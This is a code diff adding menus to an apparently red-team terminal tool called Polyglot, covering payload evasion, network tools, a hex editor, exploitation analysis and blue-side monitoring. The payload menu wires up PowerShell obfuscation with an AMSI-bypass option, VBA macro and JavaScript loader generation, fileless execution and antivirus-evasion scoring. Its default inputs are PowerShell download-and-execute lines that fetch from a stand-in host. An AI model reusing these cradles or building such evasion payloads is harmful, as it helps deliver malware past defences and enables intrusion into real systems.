@@ -942,6 +942,12 @@ class PolyglotTUI:
                 "  [bold red]10[/bold red] │ 📡 [white]Monitoring Panel[/white]\n"
                 "  [bold red]11[/bold red] │ 🔍 [white]Investigation Panel[/white]\n"
                 "  [bold red]12[/bold red] │ 🧪 [white]Benchmark & Fuzzing[/white]\n"
+                "  [bold red]13[/bold red] │ 💣 [white]Payload & Evasion[/white]\n"
+                "  [bold red]14[/bold red] │ 🏠 [white]Session & Workspace[/white]\n"
+                "  [bold red]15[/bold red] │ 🌐 [white]Network Tools[/white]\n"
+                "  [bold red]16[/bold red] │ 🔢 [white]Hex Editor[/white]\n"
+                "  [bold red]17[/bold red] │ ⚔  [white]Exploitation & Attack Paths[/white]\n"
+                "  [bold red]18[/bold red] │ 🔵 [white]Blue Side Monitoring[/white]\n"
                 "  [bold red]0[/bold red] │ ✕  [dim]Exit[/dim]\n",
                 title="[bold red]◆ POLYGLOT[/bold red]",
                 subtitle="[dim]v3.0 — Red Team + Shield Edition[/dim]",
@@ -950,7 +956,7 @@ class PolyglotTUI:
             ))
 
             choice = self.safe_input("\n[bold red]Select[/bold red]",
-                                     choices=["0","1","2","3","4","5","6","7","8","9","10","11","12"],
+                                     choices=["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18"],
                                      default="1")
             if choice is None:
                 continue
@@ -982,6 +988,18 @@ class PolyglotTUI:
                 self.menu_investigation()
             elif choice == "12":
                 self.menu_benchmark()
+            elif choice == "13":
+                self.menu_payload_evasion()
+            elif choice == "14":
+                self.menu_session_workspace()
+            elif choice == "15":
+                self.menu_network_tools()
+            elif choice == "16":
+                self.menu_hex_editor()
+            elif choice == "17":
+                self.menu_exploitation()
+            elif choice == "18":
+                self.menu_blue_side()
 
     # ── Builder Menu ─────────────────────────────────────────
 
@@ -2297,6 +2315,421 @@ class PolyglotTUI:
                     console.print(f"[red]✗ {result.get('error')}[/red]")
             except Exception as e:
                 console.print(f"[red]✗ Error: {e}[/red]")
+
+
+    def menu_payload_evasion(self):
+        console.print()
+        console.print(Panel("[bold red]💣 PAYLOAD & EVASION[/bold red]", border_style="red"))
+        console.print("  [red]1[/red] │ ⚡ PowerShell Obfuscation")
+        console.print("  [red]2[/red] │ 📄 VBA Macro Generation")
+        console.print("  [red]3[/red] │ 🌐 JavaScript Loader")
+        console.print("  [red]4[/red] │ 🦠 Fileless Execution")
+        console.print("  [red]5[/red] │ 🔍 Sandbox Detection Payload")
+        console.print("  [red]6[/red] │ 📊 AV Behavior Prediction")
+        console.print("  [red]7[/red] │ 🎯 Static Detection Scoring")
+        choice = self.safe_input("\n[bold red]Select[/bold red]", choices=["1","2","3","4","5","6","7"], default="1")
+        if choice is None: return
+        try:
+            from engines.payload_mutator import PayloadMutator
+            from engines.risk_engine import RiskScoringEngine
+            mutator = PayloadMutator()
+            if choice == "1":
+                p = self.safe_input("[cyan]PS payload[/cyan]", default="IEX (New-Object Net.WebClient).DownloadString('http://e.com/p')")
+                if not p: return
+                t = self.safe_input("[cyan]Technique[/cyan]", choices=["auto","string_concat","base64","xor","amsi_bypass","env_var","caret","tick","format_string","reverse"], default="auto")
+                if t is None: return
+                r = mutator.obfuscate_powershell(p, t)
+                console.print(f"\n[green]Technique: {r.technique}[/green]")
+                console.print(f"[yellow]Detection: {r.detection_score:.0%}[/yellow]")
+                for n in r.evasion_notes: console.print(f"  [dim]info {n}[/dim]")
+                console.print(f"\n{r.obfuscated_code}")
+            elif choice == "2":
+                p = self.safe_input("[cyan]Cmd[/cyan]", default="cmd /c calc.exe")
+                if not p: return
+                r = mutator.generate_vba_macro(p)
+                console.print(f"\n[yellow]Detection: {r.detection_score:.0%}[/yellow]\n{r.obfuscated_code}")
+            elif choice == "3":
+                url = self.safe_input("[cyan]URL[/cyan]", default="http://e.com/l.js")
+                if not url: return
+                r = mutator.generate_js_loader(url)
+                console.print(f"\n[yellow]Detection: {r.detection_score:.0%}[/yellow]\n{r.obfuscated_code}")
+            elif choice == "4":
+                p = self.safe_input("[cyan]Payload[/cyan]", default="IEX (New-Object Net.WebClient).DownloadString('http://e.com')")
+                if not p: return
+                r = mutator.generate_fileless(p)
+                console.print(f"\n[yellow]Detection: {r.detection_score:.0%}[/yellow]\n{r.obfuscated_code}")
+            elif choice == "5":
+                lang = self.safe_input("[cyan]Lang[/cyan]", choices=["powershell","vba","javascript"])
+                if lang: console.print(mutator.generate_sandbox_detector(lang))
+            elif choice == "6":
+                code = self.safe_input("[cyan]Code[/cyan]")
+                if not code: return
+                lang = self.safe_input("[cyan]Lang[/cyan]", choices=["powershell","vba","javascript"])
+                if lang is None: return
+                p = mutator.predict_av_behavior(code, lang)
+                console.print(f"\n[yellow]Score: {p['detection_score']:.0%}[/yellow] - {p['verdict']}")
+                for i in p.get('indicators',[]): console.print(f"  ! {i['trigger']}")
+                for r in p.get('recommendations',[]): console.print(f"  -> {r}")
+            elif choice == "7":
+                code = self.safe_input("[cyan]Code[/cyan]")
+                if not code: return
+                lang = self.safe_input("[cyan]Lang[/cyan]", choices=["powershell","vba","javascript"])
+                if lang is None: return
+                risk = RiskScoringEngine().score_payload(code, lang)
+                console.print(f"  [yellow]{risk.total}/100 ({risk.category})[/yellow]")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
+    def menu_session_workspace(self):
+        console.print()
+        console.print(Panel("[bold green]SESSION & WORKSPACE[/bold green]", border_style="green"))
+        console.print("  [green]1[/green] Sessions  [green]2[/green] Pinned  [green]3[/green] Recent")
+        console.print("  [green]4[/green] Snapshots [green]5[/green] Restore [green]6[/green] Notes")
+        console.print("  [green]7[/green] Chains    [green]8[/green] Export  [green]9[/green] Regex")
+        console.print("  [green]10[/green] Auto-detect URLs/IPs/Domains")
+        choice = self.safe_input("\n[bold green]Select[/bold green]", choices=[str(i) for i in range(1,11)], default="1")
+        if choice is None: return
+        try:
+            from engines.workspace import WorkspaceManager, SessionManager, RegexTester, auto_detect_targets
+            wm = WorkspaceManager()
+            sm = SessionManager()
+            if choice == "1":
+                for i, s in enumerate(sm.list_sessions()[:10]):
+                    console.print(f"  {i+1}. {s.get('name','')} [{s.get('status','')}]")
+                a = self.safe_input("[cyan]new/view[/cyan]", choices=["new","view"])
+                if a == "new":
+                    n = self.safe_input("[cyan]Name[/cyan]")
+                    if n: console.print(f"[green]Created: {sm.create_session(n)['id']}[/green]")
+            elif choice == "2":
+                for p in wm.get_pinned(): console.print(f"  pin {p['name']}")
+                f = self.safe_input("[cyan]File to pin[/cyan]")
+                if f and os.path.exists(f): wm.pin_file(f); console.print("[green]Pinned[/green]")
+            elif choice == "3":
+                for r in wm.get_recent(): console.print(f"  {r['name']}")
+            elif choice == "4":
+                a = self.safe_input("[cyan]create/list/restore[/cyan]", choices=["create","list","restore"])
+                if a == "list":
+                    for s in wm.list_snapshots()[:20]: console.print(f"  snap {s['snapshot_name']}")
+                elif a == "create":
+                    f = self.safe_input("[cyan]File[/cyan]")
+                    if f and os.path.exists(f): r = wm.create_snapshot(f); console.print(f"[green]{r['snapshot_name']}[/green]")
+                elif a == "restore":
+                    n = self.safe_input("[cyan]Name[/cyan]")
+                    if n: r = wm.restore_snapshot(n); console.print(f"[green]Restored: {r.get('restored','')}[/green]")
+            elif choice == "5":
+                f = self.safe_input("[cyan]Deleted file[/cyan]")
+                if f: r = wm.restore_deleted(f); console.print(f"[green]{r}[/green]" if r else "[red]Not found[/red]")
+            elif choice == "6":
+                for n in wm.list_notes(): console.print(f"  note {n['name']}")
+                a = self.safe_input("[cyan]new/view[/cyan]", choices=["new","view"])
+                if a == "new":
+                    n = self.safe_input("[cyan]Name[/cyan]"); c = self.safe_input("[cyan]Content[/cyan]")
+                    if n and c: wm.save_note(n, c); console.print("[green]Saved[/green]")
+                elif a == "view":
+                    n = self.safe_input("[cyan]Name[/cyan]")
+                    if n: c = wm.load_note(n); console.print(c if c else "[dim]Not found[/dim]")
+            elif choice == "7":
+                for c in wm.list_chains(): console.print(f"  chain {c['name']} ({c.get('commands',0)} cmds)")
+            elif choice == "8":
+                a = self.safe_input("[cyan]export/import[/cyan]", choices=["export","import"])
+                if a == "export":
+                    p = self.safe_input("[cyan]Path[/cyan]", default="workspace.zip")
+                    if p: r = wm.export_workspace(p); console.print(f"[green]Exported: {r['exported']}[/green]")
+                elif a == "import":
+                    p = self.safe_input("[cyan]Zip[/cyan]")
+                    if p: wm.import_workspace(p); console.print("[green]Imported[/green]")
+            elif choice == "9":
+                t = RegexTester()
+                p = self.safe_input("[cyan]Pattern[/cyan]"); s = self.safe_input("[cyan]String[/cyan]")
+                if p and s is not None:
+                    r = t.test(p, s)
+                    if r.get("valid"):
+                        console.print(f"[green]{r['match_count']} matches[/green]")
+                        for m in r.get("matches",[]): console.print(f"  [{m['start']}:{m['end']}] '{m['text']}'")
+                    else: console.print(f"[red]{r.get('error')}[/red]")
+            elif choice == "10":
+                text = self.safe_input("[cyan]Text[/cyan]")
+                if text:
+                    targets = auto_detect_targets(text)
+                    for k,v in targets.items():
+                        if v: console.print(f"  [bold]{k}:[/bold] {', '.join(v)}")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
+    def menu_network_tools(self):
+        console.print()
+        console.print(Panel("[bold cyan]NETWORK TOOLS[/bold cyan]", border_style="cyan"))
+        console.print("  [cyan]1[/cyan] DNS Lookup  [cyan]2[/cyan] Whois  [cyan]3[/cyan] TCP Connect")
+        console.print("  [cyan]4[/cyan] Raw Request [cyan]5[/cyan] History [cyan]6[/cyan] Auto-detect")
+        choice = self.safe_input("\n[bold cyan]Select[/bold cyan]", choices=["1","2","3","4","5","6"], default="1")
+        if choice is None: return
+        try:
+            from engines.network_tools import DNSLookup, WhoisLookup, TCPConnectTester, RawRequestEditor, RequestHistory, auto_detect_targets
+            if choice == "1":
+                domain = self.safe_input("[cyan]Domain[/cyan]")
+                if not domain: return
+                rtype = self.safe_input("[cyan]Type[/cyan]", choices=["A","AAAA","MX","NS","TXT","full"], default="A")
+                dns = DNSLookup()
+                if rtype == "full":
+                    for rt, d in dns.full_lookup(domain).items():
+                        console.print(f"  [bold]{rt}:[/bold] {d.get('results',[])}")
+                else:
+                    r = dns.lookup(domain, rtype)
+                    for v in r.get("results",[]): console.print(f"    {v}")
+            elif choice == "2":
+                target = self.safe_input("[cyan]Domain/IP[/cyan]")
+                if not target: return
+                r = WhoisLookup().lookup(target)
+                for k,v in r.get("parsed",{}).items(): console.print(f"  [bold]{k}:[/bold] {v}")
+            elif choice == "3":
+                host = self.safe_input("[cyan]Host[/cyan]")
+                if not host: return
+                port = self.safe_input("[cyan]Port[/cyan]", default="80")
+                if port is None: return
+                if port == "common":
+                    for r in TCPConnectTester().common_ports_scan(host):
+                        icon = "OPEN" if r.get("open") else "CLOSED"
+                        console.print(f"  {host}:{r['port']} {icon}")
+                else:
+                    r = TCPConnectTester().test(host, int(port))
+                    console.print(f"  {'OPEN' if r.get('open') else 'CLOSED'} ({r.get('latency_ms','')}ms)")
+            elif choice == "4":
+                editor = RawRequestEditor()
+                console.print("[dim]Enter raw HTTP request:[/dim]")
+                lines = []
+                while True:
+                    line = self.safe_input("")
+                    if not line: break
+                    lines.append(line)
+                raw = "\r\n".join(lines)
+                if raw:
+                    parsed = editor.parse(raw)
+                    console.print(f"  {parsed.get('method','')} {parsed.get('path','')} Host: {parsed.get('host','')}")
+                    send = self.safe_confirm("[cyan]Send?[/cyan]", default=False)
+                    if send and parsed.get('host'):
+                        resp = editor.send(raw, parsed['host'])
+                        console.print(f"  Status: {resp.get('status_code', resp.get('error',''))}")
+            elif choice == "5":
+                h = RequestHistory()
+                for e in h.get(limit=20): console.print(f"  {e.get('host','')} -> {e.get('status_code','')}")
+            elif choice == "6":
+                text = self.safe_input("[cyan]Text[/cyan]")
+                if text:
+                    t = auto_detect_targets(text)
+                    for k,v in t.items():
+                        if v: console.print(f"  [bold]{k}:[/bold] {', '.join(v)}")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
+    def menu_hex_editor(self):
+        console.print()
+        console.print(Panel("[bold yellow]HEX EDITOR[/bold yellow]", border_style="yellow"))
+        console.print("  [yellow]1[/yellow] Hex Dump (polyglot red-marks)  [yellow]2[/yellow] Search Hex")
+        console.print("  [yellow]3[/yellow] Search ASCII                  [yellow]4[/yellow] Entropy Map")
+        console.print("  [yellow]5[/yellow] Diff Files                    [yellow]6[/yellow] Format Detection")
+        choice = self.safe_input("\n[bold yellow]Select[/bold yellow]", choices=["1","2","3","4","5","6"], default="1")
+        if choice is None: return
+        try:
+            from engines.hex_editor import HexEditor
+            ed = HexEditor()
+            if choice == "1":
+                fpath = self.safe_input("[cyan]File[/cyan]")
+                if not fpath or not os.path.exists(fpath): return
+                result = ed.hex_dump(fpath, length=2048)
+                console.print(f"\n[bold]{fpath}[/bold] ({result['file_size']:,} bytes)")
+                for line in result["lines"]:
+                    addr = f"{line['offset']:08x}"
+                    hex_s = " ".join(v for v, _ in line["hex"])
+                    ascii_s = "".join(v for v, _ in line["ascii"])
+                    has_red = any(c == "red" for _, c in line["hex"])
+                    style = "bold red" if has_red else "dim"
+                    console.print(f"  [{style}]{addr}  {hex_s:<48s}  |{ascii_s}|[/{style}]")
+                    for ann in line.get("annotations",[]): console.print(f"    [bold red]>> {ann}[/bold red]")
+                if result.get("extra_data_offset") is not None:
+                    console.print(f"\n  [bold red]POLYGLOT: Extra data at 0x{result['extra_data_offset']:x}[/bold red]")
+            elif choice == "2":
+                fpath = self.safe_input("[cyan]File[/cyan]"); p = self.safe_input("[cyan]Hex pattern[/cyan]")
+                if fpath and p:
+                    for r in ed.search_hex(fpath, p)[:20]:
+                        console.print(f"  [{r['hex_offset']}] {r.get('context_hex','')[:60]}")
+            elif choice == "3":
+                fpath = self.safe_input("[cyan]File[/cyan]"); p = self.safe_input("[cyan]String[/cyan]")
+                if fpath and p:
+                    for r in ed.search_ascii(fpath, p)[:20]:
+                        console.print(f"  [{r['hex_offset']}] {r.get('context','')[:60]}")
+            elif choice == "4":
+                fpath = self.safe_input("[cyan]File[/cyan]")
+                if fpath:
+                    blocks = ed.entropy_map(fpath)
+                    for b in blocks[:48]:
+                        bar = "X" * b["bar"]
+                        s = {"red":"bold red","yellow":"yellow","green":"green"}.get(b["color"],"white")
+                        console.print(f"  [{s}]{bar:<80s}[/{s}] {b['entropy']:.2f}")
+            elif choice == "5":
+                f1 = self.safe_input("[cyan]File 1[/cyan]"); f2 = self.safe_input("[cyan]File 2[/cyan]")
+                if f1 and f2:
+                    r = ed.diff_view(f1, f2)
+                    console.print(f"  Diffs: {r['total_diffs']}")
+                    for d in r["differences"][:20]:
+                        console.print(f"  0x{d['offset']:08x}: {d['diff_count']} bytes differ")
+            elif choice == "6":
+                fpath = self.safe_input("[cyan]File[/cyan]")
+                if fpath and os.path.exists(fpath):
+                    with open(fpath, "rb") as f: data = f.read(1024)
+                    regions = ed._detect_regions(data, 0)
+                    for r in regions:
+                        s = {"green":"green","red":"bold red","yellow":"yellow","cyan":"cyan"}.get(r.color,"white")
+                        console.print(f"  [{s}]{r.name}[/{s}] 0x{r.start:x}-0x{r.end:x}: {r.description}")
+                    if not regions: console.print("[dim]No format detected.[/dim]")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
+    def menu_exploitation(self):
+        console.print()
+        console.print(Panel("[bold red]EXPLOITATION & ATTACK PATHS[/bold red]", border_style="red"))
+        console.print("  [red]1[/red] Vulnerability Correlation  [red]2[/red] Credential Chain Analysis")
+        console.print("  [red]3[/red] Attack Chain Analysis      [red]4[/red] Risk Scoring")
+        console.print("  [red]5[/red] Generate Report (MD/PDF)")
+        choice = self.safe_input("\n[bold red]Select[/bold red]", choices=["1","2","3","4","5"], default="1")
+        if choice is None: return
+        try:
+            from engines.risk_engine import RiskScoringEngine, VulnCorrelator, CredentialChainAnalyzer, AttackChainAnalyzer, ReportGenerator
+            if choice == "1":
+                fpath = self.safe_input("[cyan]File[/cyan]")
+                if not fpath or not os.path.exists(fpath): return
+                with open(fpath, "rb") as f: data = f.read()
+                vulns = VulnCorrelator().correlate(data)
+                if vulns:
+                    for v in vulns:
+                        icon = "CRIT" if v["severity"] == "critical" else "HIGH"
+                        console.print(f"  [{icon}] {v['cve']} ({v['name']}): {v['description']}")
+                else: console.print("[green]No known vuln patterns found.[/green]")
+            elif choice == "2":
+                fpath = self.safe_input("[cyan]File[/cyan]")
+                if not fpath or not os.path.exists(fpath): return
+                with open(fpath, "rb") as f: data = f.read()
+                creds = CredentialChainAnalyzer().analyze(data)
+                if creds:
+                    for c in creds: console.print(f"  [{c['category']}] {c['masked_value']}")
+                else: console.print("[green]No credentials found.[/green]")
+            elif choice == "3":
+                console.print("[dim]Run a scan first, then analyze the chain.[/dim]")
+                chain = AttackChainAnalyzer().analyze_chain([])
+                console.print(f"  Stages: {chain['stages_activated']}")
+            elif choice == "4":
+                fpath = self.safe_input("[cyan]File[/cyan]")
+                if fpath and os.path.exists(fpath):
+                    risk = RiskScoringEngine().score_file(fpath, {})
+                    console.print(f"\n  [yellow]Score: {risk.total}/100 ({risk.category})[/yellow]")
+                    for f, v in sorted(risk.factors.items(), key=lambda x: -x[1]):
+                        bar = "X" * int(v * 10) + "." * (10 - int(v * 10))
+                        console.print(f"  {f}: {bar} {v:.0%}")
+                    for d in risk.details: console.print(f"  * {d}")
+                    for r in risk.recommendations: console.print(f"  -> {r}")
+            elif choice == "5":
+                fpath = self.safe_input("[cyan]File[/cyan]")
+                if not fpath: return
+                rg = ReportGenerator()
+                risk = RiskScoringEngine().score_file(fpath, {})
+                md_path = rg.generate_markdown({}, risk_score=risk)
+                console.print(f"[green]Report: {md_path}[/green]")
+                pdf = rg.generate_pdf(md_path)
+                if pdf: console.print(f"[green]PDF/HTML: {pdf}[/green]")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
+    def menu_blue_side(self):
+        console.print()
+        console.print(Panel("[bold blue]BLUE SIDE MONITORING[/bold blue]", border_style="blue"))
+        console.print("  [blue]1[/blue] Network Logs       [blue]2[/blue] Request History")
+        console.print("  [blue]3[/blue] WebSocket Monitor  [blue]4[/blue] DNS Lookup")
+        console.print("  [blue]5[/blue] Whois Lookup       [blue]6[/blue] TCP Connect Tester")
+        console.print("  [blue]7[/blue] Raw Request Editor [blue]8[/blue] Connection Viewer")
+        console.print("  [blue]9[/blue] Process Viewer     [blue]10[/blue] Alerts Panel")
+        console.print("  [blue]11[/blue] File Change Mon   [blue]12[/blue] Audit Log")
+        choice = self.safe_input("\n[bold blue]Select[/bold blue]",
+                                 choices=[str(i) for i in range(1,13)], default="1")
+        if choice is None: return
+        try:
+            from engines.network_tools import DNSLookup, WhoisLookup, TCPConnectTester, RawRequestEditor, RequestHistory
+
+            if choice == "1":
+                h = RequestHistory()
+                for e in h.get(limit=30):
+                    console.print(f"  [{e.get('timestamp','')}] {e.get('method','')} {e.get('host','')}{e.get('path','')} -> {e.get('status_code','')}")
+                if not h.get(limit=1): console.print("[dim]No network logs yet.[/dim]")
+            elif choice == "2":
+                self._request_history()
+            elif choice == "3":
+                console.print("[dim]WebSocket monitoring watches for WS upgrade requests in network logs.[/dim]")
+                h = RequestHistory()
+                ws_events = [e for e in h.get(limit=100) if 'upgrade' in str(e).lower() or 'websocket' in str(e).lower()]
+                if ws_events:
+                    for e in ws_events: console.print(f"  WS: {e.get('host','')} {e.get('path','')}")
+                else: console.print("[dim]No WebSocket events found.[/dim]")
+            elif choice == "4":
+                domain = self.safe_input("[cyan]Domain[/cyan]")
+                if domain:
+                    r = DNSLookup().full_lookup(domain)
+                    for rt, d in r.items():
+                        console.print(f"  [bold]{rt}:[/bold] {d.get('results',[])}")
+            elif choice == "5":
+                target = self.safe_input("[cyan]Domain/IP[/cyan]")
+                if target:
+                    r = WhoisLookup().lookup(target)
+                    for k,v in r.get("parsed",{}).items(): console.print(f"  [bold]{k}:[/bold] {v}")
+            elif choice == "6":
+                host = self.safe_input("[cyan]Host[/cyan]")
+                if host:
+                    port = self.safe_input("[cyan]Port[/cyan]", default="80")
+                    if port:
+                        r = TCPConnectTester().test(host, int(port))
+                        console.print(f"  {'OPEN' if r.get('open') else 'CLOSED'} ({r.get('latency_ms','')}ms)")
+            elif choice == "7":
+                self._raw_request_editor()
+            elif choice == "8":
+                self._connection_viewer()
+            elif choice == "9":
+                self._process_viewer()
+            elif choice == "10":
+                self._alerts_panel()
+            elif choice == "11":
+                self._file_change_monitor()
+            elif choice == "12":
+                self._workspace_audit_log()
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
+    def _request_history(self):
+        try:
+            from engines.network_tools import RequestHistory
+            h = RequestHistory()
+            for e in h.get(limit=30):
+                console.print(f"  [{e.get('timestamp','')}] {e.get('host','')} -> {e.get('status_code','')}")
+            if not h.get(limit=1): console.print("[dim]No requests logged yet.[/dim]")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
+    def _raw_request_editor(self):
+        try:
+            from engines.network_tools import RawRequestEditor
+            editor = RawRequestEditor()
+            console.print("[dim]Enter raw HTTP request (empty line to end):[/dim]")
+            lines = []
+            while True:
+                line = self.safe_input("")
+                if not line: break
+                lines.append(line)
+            raw = "\r\n".join(lines)
+            if raw:
+                parsed = editor.parse(raw)
+                console.print(f"  {parsed.get('method','')} {parsed.get('path','')} Host: {parsed.get('host','')}")
+                send = self.safe_confirm("[cyan]Send?[/cyan]", default=False)
+                if send and parsed.get('host'):
+                    resp = editor.send(raw, parsed['host'])
+                    console.print(f"  Status: {resp.get('status_code', resp.get('error',''))}")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
 
 
 # ── Direct CLI Commands ──────────────────────────────────────
